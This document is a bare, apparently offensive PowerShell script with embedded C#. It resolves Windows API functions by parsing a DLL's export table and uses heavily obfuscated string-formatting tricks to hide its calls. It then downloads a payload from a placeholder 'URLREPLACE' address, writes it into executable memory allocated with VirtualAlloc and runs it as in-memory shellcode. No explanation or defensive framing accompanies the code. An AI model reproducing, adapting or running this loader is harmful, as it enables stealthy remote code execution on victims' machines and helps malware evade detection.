Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
public class load {

    public delegate void Run();
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate IntPtr GetMemory(IntPtr lpStartAddr, int size, int flAllocationType, int flProtect);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate bool Right(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static Type RunInfo()
    {
        return typeof(Run);
    }
    public static Type GetMemoryInfo()
    {
        return typeof(GetMemory);
    }
    public static Type RightInfo()
    {
        return typeof(Right);
    }

    public static IntPtr Address(string DLLName, string funcName)
    {
        IntPtr Module = IntPtr.Zero;
        foreach (ProcessModule Mod in Process.GetCurrentProcess().Modules) if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower())) Module = Mod.BaseAddress;
        long Header = Module.ToInt64() + Marshal.ReadInt32((IntPtr)(Module.ToInt64() + 0x3C)) + 0x18;
        int export = Marshal.ReadInt32((IntPtr)Header + 0x70);
        for (int i = 0; i < Marshal.ReadInt32((IntPtr)(Module.ToInt64() + export + 0x18)); i++)
        {
            string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(Module.ToInt64() + Marshal.ReadInt32((IntPtr)(Module.ToInt64() + Marshal.ReadInt32((IntPtr)(Module.ToInt64() + export + 0x20)) + i * 4))));
            if (FunctionName.Equals(funcName, StringComparison.OrdinalIgnoreCase))
            {
                int FunctionOrdinal = Marshal.ReadInt16((IntPtr)(Module.ToInt64() + Marshal.ReadInt32((IntPtr)(Module.ToInt64() + export + 0x24)) + i * 2)) + Marshal.ReadInt32((IntPtr)(Module.ToInt64() + export + 0x20));
                int func = Marshal.ReadInt32((IntPtr)(Module.ToInt64() + Marshal.ReadInt32((IntPtr)(Module.ToInt64() + export + 0x1C)) + (4 * (FunctionOrdinal - Marshal.ReadInt32((IntPtr)(Module.ToInt64() + export + 0x20))))));
                return Module + func;
            }
        }
        return IntPtr.Zero;
    }
}
"@
Add-Type -AssemblyName System.Net.Http
${X`LA}=  [TyPE]("{1}{0}{4}{3}{2}" -f'.hTT','SySTeM.net','nT','hTtPcLIE','p.')  ; 
 .("{0}{2}{1}" -f 'sEt-','Tem','i') ("{0}{3}{1}{2}{4}"-f'Va','lE',':8Z2','RiaB','KC') (  [TYpe]("{2}{1}{3}{0}"-f 'pTr','ySt','S','EM.INt'));
 ${f`TZJ} =  [TYPe]("{6}{4}{5}{3}{8}{7}{0}{1}{2}"-F 'v','iCEs.MArS','hAL','e.iNteR','runT','Im','SysTEm.','Ser','oP'); .("{2}{1}{0}{3}" -f'A','ArI','sEt-v','Ble')  ("{0}{1}"-f '5s0','P')  ([tYpe]("{0}{1}"-F 'lo','aD'))  ;
 [Byte[]]${Bu`FF} =  ( .("{0}{1}{2}"-f 'G','Et-','item') ("{0}{2}{3}{1}"-f 'v','La','Ari','ABlE:X') )."VaL`Ue"::("{1}{0}"-f'ew','n').Invoke().("{0}{1}{3}{2}"-f 'G','etB','yAsync','yteArra').Invoke("URLREPLACE")."r`ESU`lt";${FuNCa`D`Dr} = (  (  &('lS')  ('V'+'aRiABLE:'+'fTZ'+'J'))."VA`LUe"::("{2}{1}{3}{0}{5}{6}{4}" -f'nctionP','or','GetDelegateF','Fu','r','oint','e').Invoke( (.("{0}{1}"-f 'Di','R') ("vAriA"+"bLe"+":5"+"s0p") )."Val`UE"::("{0}{1}" -f 'Addr','ess').Invoke(("{1}{2}{0}"-f '2.dll','kernel','3'), ("{0}{1}{2}" -f 'Virt','ualA','lloc')),  (  .("{2}{1}{3}{0}" -f'eM','et-cHiLDI','G','T') ("{3}{1}{2}{0}"-f 'p','ARiaBl','e:5s0','v'))."Va`LUE"::("{0}{2}{3}{1}" -f 'G','Info','etM','emory').Invoke()));${intp`T`R`ADdr} = ${fuNc`A`D`DR}."iNV`OkE"(  (.("{1}{2}{0}" -f 'M','Get-it','E') ("{2}{0}{1}" -f':8z2','Kc','VARIAbLe')  )."vAL`Ue"::"z`erO",${BU`Ff}."leNg`Th",0x3000,0x40);  ( .("{0}{1}"-f 'gC','i') ("vAriABle:f"+"t"+"Zj"))."va`lUe"::("{1}{0}" -f'opy','C').Invoke(${bu`Ff}, 0, ${INT`P`TRaddR}, ${Bu`FF}."Le`Ng`Th");(  ${ft`Zj}::("{4}{1}{7}{5}{8}{0}{2}{6}{3}" -f'teFo','et','rFunctionPoin','er','G','eleg','t','D','a').Invoke(${Int`pTRad`Dr},   (&("{1}{0}{2}"-f 'ar','V','iAblE')  ("{1}{0}"-f'P','5S0')  -vA)::("{1}{2}{0}"-f 'o','Ru','nInf').Invoke()))."in`VOKE"()






